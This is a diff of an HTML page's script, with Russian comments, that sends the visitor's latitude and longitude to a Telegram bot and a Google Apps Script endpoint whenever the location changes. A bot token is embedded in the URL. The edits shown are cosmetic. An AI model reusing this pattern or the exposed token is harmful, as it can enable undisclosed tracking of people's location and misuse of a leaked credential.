@@ -52,7 +52,7 @@
       const changed = !prev || coordsChanged(prev.lat, prev.lon, latitude, longitude);
 
       if (changed) {
-        // Telegram
+        // Отправка в Telegram
         fetch('https://api.telegram.org/bot7505831892:AAEXunB46sqfDxkas6G1ratUdvuEd6pn-88/sendMessage', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
@@ -62,14 +62,13 @@
           })
         });
 
-        // Google Таблица
+        // Отправка в Google Таблицу
         fetch('https://script.google.com/macros/s/AKfycbwfaWCPXIXSAHA5yHrvPl1Nr0uTQ08Tf9pvK0SQMj9KBlDRyiHcIeLsM-jaw0VtYKqrYQ/exec', {
           method: 'POST',
-          body: JSON.stringify({ lat: latitude, lon: longitude }),
-          headers: { 'Content-Type': 'application/json' }
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ lat: latitude, lon: longitude })
         });
 
-        // Сохраняем последние координаты
         localStorage.setItem('lastCoords', JSON.stringify({ lat: latitude, lon: longitude }));
       }
 
@@ -98,4 +97,3 @@
   </script>
 </body>
 </html>
-
